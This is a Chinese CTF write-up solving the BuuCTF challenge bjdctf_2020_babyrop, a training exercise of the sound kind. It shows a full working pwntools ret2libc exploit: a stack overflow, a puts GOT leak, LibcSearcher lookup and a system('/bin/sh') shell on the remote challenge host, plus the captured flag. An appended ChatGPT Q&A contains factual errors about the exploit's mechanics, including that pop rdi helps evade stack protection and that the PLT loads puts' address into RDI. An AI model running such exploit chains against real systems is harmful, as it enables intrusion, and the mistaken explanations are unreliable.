---
tags:
  - BuuCTF
  - 简单
  - ret2libc
---

# bjdctf_2020_babyrop

## 前置工作

先 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec bjdctf_2020_babyrop 
[*] '/home/ela/Pwn/bjdctf_2020_babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

没啥问题，再用 IDA 64 看看，先看一下主函数 `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

再看一下 `init()`，这里已经提示我们要用 Ret2Libc 来做题了

```c
int init()
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Can u return to libc ?");
  return puts("Try u best!");
}
```

再看一下 `vuln()`，通常这里是漏洞

```c
ssize_t vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Pull up your sword and tell me u story!");
  return read(0, buf, 0x64uLL);
}
```

看出来了 `buf` 只有 0x20 个大小，但是能接受 0x64 的数据，这里就会栈溢出

那么接下来就开始 Ret2Libc

## 泄露 `puts()` 函数真实地址

先把能写出来的代码写上，都有用

```python
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 28549)
elf = ELF("./bjdctf_2020_babyrop")

main_addr = elf.symbols["main"] # 便于获取完 puts() 真实地址后再来一次
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
```

然后我们需要 `pop rdi; ret` 的指令，于是我们用 ROPgadget 来找，地址是 `0x400733`

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary  bjdctf_2020_babyrop --only "pop|ret"
Gadgets information
============================================================
0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400730 : pop r14 ; pop r15 ; ret
0x0000000000400732 : pop r15 ; ret
0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x0000000000400733 : pop rdi ; ret
0x0000000000400731 : pop rsi ; pop r15 ; ret
0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004c9 : ret
```

随后构造第一个 Payload

```python
pop_rdi_ret = 0x400733

payload1 = b"A"*(0x20+0x8) + pack(pop_rdi_ret, 64) + pack(puts_got, 64) + pack(puts_plt, 64) + pack(main_addr, 64)
io.sendlineafter(b"Pull up your sword and tell me u story!\n", payload1)
puts_addr = unpack(io.recvline().strip().ljust(8, b"\0"), 64)
```

此时的 `puts_addr` 就是此时此刻下的 `puts()` 函数的真实地址了

随后我们用 LibcSearcher 来求出所需函数和参数的真实地址（即 `system()` 和 `/bin/sh`）

## 使用 Libc 知一求多

```python
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts") # 基地址

system_addr = libc_base + libc.dump("system") # system() 地址
bin_sh_addr = libc_base + libc.dump("str_bin_sh") # /bin/sh 地址
```

OK，有了这些就能构造第二个 Payload

```python
payload2 = b"A"*(0x20+0x8) + pack(pop_rdi_ret, 64) + pack(bin_sh_addr, 64) + pack(system_addr, 64)
io.sendlineafter(b"Pull up your sword and tell me u story!\n", payload2)
```

随后就能 `io.interactive()`，这个 `puts()` 可能会对应多个 Libc，最差的方法就是一个一个试过去（我自己是这么干的）

## 附总 Exp

```python
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 28549)
elf = ELF("./bjdctf_2020_babyrop")

main_addr = elf.symbols["main"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

pop_rdi_ret = 0x400733

payload1 = b"A"*(0x20+0x8) + pack(pop_rdi_ret, 64) + pack(puts_got, 64) + pack(puts_plt, 64) + pack(main_addr, 64)
io.sendlineafter(b"Pull up your sword and tell me u story!\n", payload1)
puts_addr = unpack(io.recvline().strip().ljust(8, b"\0"), 64)

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")

system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")

payload2 = b"A"*(0x20+0x8) + pack(pop_rdi_ret, 64) + pack(bin_sh_addr, 64) + pack(system_addr, 64)
io.sendlineafter(b"Pull up your sword and tell me u story!\n", payload2)

io.interactive()
```

最后得到的 Flag 是 `flag{b050bf66-64a5-4ceb-bc37-8cf0ec5812a3}`

## FAQ / ChatGPT

!!! question "关于 Payload 1"
    请你给我详细解释一下 Payload1 的构造过程，请生动形象一点，我是汇编语言的初学者，对寄存器的了解不够深刻

当构造payload1时，你可以将其视为一种"魔法字符串"，这个字符串将会被传递给受攻击的程序，以触发漏洞并执行一系列指令。这里的漏洞是一种栈溢出漏洞，通过构造payload1，我们将劫持程序的控制流，使其执行我们所希望的操作。让我用一个生动的比喻来解释这个构造过程：

Imagine you're preparing a special potion to control a robot:

"A"*(0x20+0x8): 你需要一个特殊的瓶子来装这个魔法药水，这个瓶子有40个位置。你把40滴"魔法水"（用"A"表示）滴入瓶子里，这些魔法水是用来填充瓶子的，因为瓶子容量有限，你需要确保把它填满。瓶子的尺寸是0x20+0x8，共40滴。

pack(pop_rdi_ret, 64): 你需要一个魔杖来施放你的魔法，这个魔杖的作用是告诉机器要做什么。pop_rdi_ret是一根有特殊力量的魔杖，使用64位的魔法符咒，所以你将这个魔杖装进了瓶子里。

pack(puts_got, 64): 在瓶子里，你还需要一张地图，这张地图上有一个坐标，指向了一个宝藏的地方。这里，puts_got是宝藏的坐标，它是程序中的puts函数的GOT地址。你把这张地图也装进了瓶子里，使用了64位的坐标。

pack(puts_plt, 64): 接下来，你需要一张另外的地图，上面写着一段咒语，这段咒语会告诉机器执行哪个魔法。puts_plt是指向puts函数的PLT地址的咒语。你也把这张地图装进了瓶子里。

pack(main_addr, 64): 最后，你需要一张回家的地图，因为你完成任务后需要回到原点。这里，main_addr是程序的main函数的地址，它将告诉机器返回到main函数，使它可以继续执行程序的正常流程。这张地图也被装进了瓶子。

一旦你将这个魔法瓶子交给机器，它会按照你的指示，先执行pop_rdi_ret魔杖，然后拿着puts_got地图去puts函数的位置挖宝。一旦找到宝藏（puts的真实地址），它将根据puts_plt的咒语，执行puts函数，向你传递宝藏的信息。最后，根据main_addr的地图，机器会回到原点，准备执行下一步的魔法。

这就是构造payload1的过程，它利用了栈溢出漏洞，将程序的控制流引导到我们希望的位置，以泄漏puts函数的地址，为后续的攻击步骤做准备。这是一种利用栈溢出漏洞进行ROP（Return-Oriented Programming）攻击的典型示例。

!!! question "关于 pop rdi; ret"
    pop_rdi_ret 有什么用呢

pop_rdi_ret 是一个 gadget，通常用于 ROP 攻击中，特别是在64位的x86架构上。它的作用是将一个值从栈中弹出并存储到 RDI 寄存器中，因为在x86-64架构中，RDI通常用于存储函数的第一个参数。

在 ROP 攻击中，pop_rdi_ret gadget 常常被用于执行以下任务：

1. 设置函数参数：很多情况下，你需要将一个值（通常是一个地址）传递给一个函数作为参数，例如将文件路径传递给 system 函数。pop_rdi_ret 可以用来将这个值从栈中弹出并加载到RDI寄存器中，以便在之后的函数调用中使用。

2. 绕过栈保护：当你进行 ROP 攻击时，你需要控制程序的执行流，而这通常涉及到修改栈上的数据。pop_rdi_ret 可以用来正确加载RDI寄存器，而不会破坏栈上的其他数据，以避免触发栈保护机制。

3. 构建ROP链：pop_rdi_ret 是ROP链的关键组成部分，它用于加载函数参数，从而实现攻击的目标。

总之，pop_rdi_ret 是在64位x86架构上常见的 gadget，它用于正确设置函数参数，避免栈保护，以及构建ROP链，以实现各种类型的攻击。

!!! question "还是关于 Payload 1"
    我不知道为什么有 PLT 和 GOT 就能使他执行 puts 函数，而且这里 puts 出来的是真实地址吗？

对于你的疑问，让我解释一下PLT（Procedure Linkage Table）和GOT（Global Offset Table）以及为什么这个Payload 1可以泄漏puts函数的真实地址。

PLT 和 GOT 是用于共享库函数调用的重要数据结构，通常在程序的运行时动态链接阶段使用。在ELF（Executable and Linkable Format）可执行文件中，这些表用于解决函数调用的地址。

在你的Payload 1中：

- puts_got 表示 puts 函数的GOT（Global Offset Table）地址。
- puts_plt 表示 puts 函数的PLT（Procedure Linkage Table）地址。

现在，让我解释为什么这个Payload可以泄漏puts函数的真实地址：

1. pop_rdi_ret gadget 的作用是将栈上的值弹出并加载到RDI寄存器中。在这种情况下，它弹出 puts_got 的地址并将它加载到RDI寄存器。

2. 接下来，程序执行 puts_plt，这将跳转到PLT中的入口点。PLT是一个跳板，它实际上不执行函数，而是负责解析并调用真实的库函数。在第一次调用时，PLT会加载GOT中的实际函数地址（也就是puts的真实地址），然后跳转到那个地址。

3. 由于第一次调用 puts，PLT会将puts的真实地址加载到RDI寄存器中，然后跳转到真实的puts函数，执行输出操作。这就是为什么在第一次调用 puts 时，它会打印出相应的内容。

4. 一旦puts函数执行完毕，程序将继续执行 main 函数，因为 main_addr 是Payload中的下一个返回地址。

所以，这个Payload 1的目的是通过调用puts函数，来泄漏puts函数的真实地址，而不是实际执行puts的输出功能。这个真实地址是在第一次调用puts时从GOT中加载的。一旦你有了这个真实地址，你可以计算libc库的基址，并继续构建ROP链以进行进一步的攻击。

!!! question "关于 GOT 和 PLT"
    请再详细描述一下 GOT 和 PLT

理解GOT（Global Offset Table）和PLT（Procedure Linkage Table）对于理解共享库的加载和动态链接是非常重要的。这两个表通常在ELF（Executable and Linkable Format）可执行文件中存在，并在程序的运行时动态链接阶段使用。

**GOT（Global Offset Table）:**

1. 作用: GOT 是一个表，包含程序中使用的共享库函数的地址。它的主要目的是存储这些函数的真实地址，以便程序在运行时能够正确调用它们。

2. 工作原理: 当程序首次运行时，GOT中的条目通常包含了共享库函数的"PLT桩函数"地址，而不是函数的真实地址。PLT桩函数是一个小的代码片段，它的作用是解析函数的真实地址并跳转到它。当程序首次调用某个共享库函数时，PLT桩函数将从GOT中加载真实地址并更新GOT的相应条目，以便将真实地址存储在GOT中，以供后续的函数调用使用。

3. 维护和更新: GOT的更新是由动态链接器完成的。它负责将共享库函数的真实地址加载到GOT中，并在之后的函数调用中使用这些地址。这个机制确保了共享库函数的正确调用。

**PLT（Procedure Linkage Table）:**

1. 作用: PLT是一个包含"桩函数"的表，用于调用共享库函数。PLT中的每个桩函数都负责解析函数的真实地址，并跳转到这个地址，同时负责更新GOT中的相应条目。

2. 工作原理: 当程序第一次调用某个共享库函数时，它实际上会跳转到该函数的PLT桩函数。PLT桩函数的工作流程如下：
    - 从GOT中加载共享库函数的真实地址，如果没有被更新过，会导致调用动态链接器以解析真实地址。
    - 跳转到真实地址，实际执行函数。
    - 更新GOT中的相应条目，以便将真实地址存储在GOT中，以供后续的函数调用使用。

3. 延迟绑定: PLT和GOT的机制允许"延迟绑定"，也就是说，在程序运行时，函数的真实地址只有在首次调用时才会解析和加载，而后续的调用都会使用GOT中已经存储的真实地址。

总之，GOT和PLT是用于支持动态链接和延迟绑定的重要数据结构。它们使得程序能够在运行时加载和调用共享库函数，而不需要在编译时知道函数的确切地址。这使得程序更加灵活，能够适应各种不同的环境和库的变化。